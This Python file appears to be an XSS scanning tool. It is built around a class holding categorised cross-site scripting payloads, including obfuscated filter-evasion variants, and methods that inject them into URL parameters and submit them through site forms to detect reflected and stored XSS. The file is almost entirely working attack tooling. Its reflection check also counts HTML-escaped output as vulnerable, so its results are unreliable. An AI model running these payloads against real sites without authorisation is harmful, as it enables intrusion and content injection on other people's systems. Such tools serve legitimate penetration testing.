import html
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin

class AdvancedXSSInjector:
    def __init__(self, session):
        self.session = session
        self.xss_payloads = {
            "basic": [
                "<script>alert('XSS')</script>",
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
            ],
            "obfuscated": [
                "<scr<script>ipt>alert(1)</scr<script>ipt>",
                "%3Cscript%3Ealert(1)%3C/script%3E",
                "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
                "<svg/onload=alert`1`>",
                "'-alert(1)-'",
            ],
            "advanced": [
                "<details open ontoggle=alert(1)>",
                "<body onload=alert(1)>",
                "<input type=image src onerror=alert(1)>",
                "<math><mtext></mtext><mglyph><malignmark></mglyph><svg/onload=alert(1)>",
                "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//--",
                "<IMG SRC=j&#X41vascript:alert('test2')>"
            ],
            "dom_based": [
                "#<script>alert(1)</script>",
                "javascript:alert(1)//",
                "\"-alert(1)-\"",
                "?param=<script>alert(1)</script>",
                "#alert(1)",
            ],
            "event_handlers": [
                "<div onmouseover=alert(1)>Hover me</div>",
                "<input onfocus=alert(1) autofocus>",
                "<a href=\"javascript:alert(1)\">Click me</a>",
                "<form onsubmit=alert(1)><input type=submit>"
            ]
        }
        
    def test_reflected_xss(self, url, params):
        """Test for reflected XSS vulnerabilities"""
        results = []
        
        for param_name, param_value in params.items():
            for category, payloads in self.xss_payloads.items():
                for payload in payloads:
                    try:
                        # Create test params with payload
                        test_params = params.copy()
                        test_params[param_name] = payload
                        
                        # Send request
                        response = self.session.get(url, params=test_params, timeout=5)
                        
                        # Check if payload is reflected
                        if self.check_payload_reflection(response.text, payload):
                            severity = self.assess_xss_severity(response.text, payload)
                            results.append({
                                "url": url,
                                "parameter": param_name,
                                "payload": payload,
                                "category": category,
                                "severity": severity,
                                "reflected": True,
                                "type": "Reflected XSS"
                            })
                            break  # Found vulnerability for this param
                    except Exception as e:
                        continue
        
        return results
    
    def test_stored_xss(self, form, payload):
        """Test for stored XSS vulnerabilities"""
        url = form["action"]
        method = form.get("method", "get").lower()
        data = {}
        
        # Prepare form data with payload
        for field in form["inputs"]:
            data[field["name"]] = payload
        
        try:
            # Submit form with payload
            if method == "post":
                response = self.session.post(url, data=data, timeout=5)
            else:
                response = self.session.get(url, params=data, timeout=5)
            
            # Check if payload is stored and executed
            if self.check_stored_xss(url, payload):
                return {
                    "vulnerable": True,
                    "type": "Stored XSS",
                    "payload": payload,
                    "form_action": url,
                    "inputs": data
                }
        except Exception as e:
            pass
        
        return {"vulnerable": False}
    
    def check_payload_reflection(self, response_text, payload):
        """Check if payload is reflected in response"""
        # Check exact payload
        if payload in response_text:
            return True
        
        # Check unencoded payload
        unencoded = html.unescape(payload)
        if unencoded in response_text and unencoded != payload:
            return True
        
        # Check for partially encoded payloads
        encoded_variations = [
            payload.replace("<", "&lt;").replace(">", "&gt;"),
            payload.replace("'", "&#39;").replace('"', "&quot;"),
            payload.replace("(", "&#40;").replace(")", "&#41;")
        ]
        
        for encoded in encoded_variations:
            if encoded in response_text:
                return True
        
        return False
    
    def check_stored_xss(self, url, payload, max_checks=3):
        """Check if XSS payload was stored by checking multiple times"""
        for _ in range(max_checks):
            try:
                response = self.session.get(url, timeout=5)
                if payload in response.text:
                    return True
            except:
                pass
        return False
    
    def assess_xss_severity(self, response_text, payload):
        """Assess severity of XSS vulnerability"""
        # Check if payload is unmodified (high severity)
        if payload in response_text:
            return "HIGH"
        
        # Check if payload is partially escaped (medium severity)
        escaped_payload = html.escape(payload)
        if escaped_payload in response_text:
            return "MEDIUM"
        
        # Check if only part of payload is present (low severity)
        for part in payload.split():
            if len(part) > 5 and part in response_text:
                return "LOW"
        
        return "INFO"
    
    def scan_all_xss(self, url, forms, params=None):
        """Comprehensive XSS scan"""
        results = {
            "reflected_xss": [],
            "stored_xss": [],
            "dom_xss": [],
            "summary": {}
        }
        
        # Test reflected XSS on URL parameters
        if params:
            reflected = self.test_reflected_xss(url, params)
            results["reflected_xss"].extend(reflected)
        
        # Test stored XSS on forms
        for form in forms:
            for category, payloads in self.xss_payloads.items():
                for payload in payloads[:3]:  # Test 3 payloads per category
                    stored_result = self.test_stored_xss(form, payload)
                    if stored_result["vulnerable"]:
                        stored_result["category"] = category
                        results["stored_xss"].append(stored_result)
                        break
        
        # Generate summary
        results["summary"] = {
            "total_reflected": len(results["reflected_xss"]),
            "total_stored": len(results["stored_xss"]),
            "total_vulnerabilities": len(results["reflected_xss"]) + len(results["stored_xss"]),
            "high_severity": sum(1 for r in results["reflected_xss"] if r.get("severity") == "HIGH")
        }
        
        return results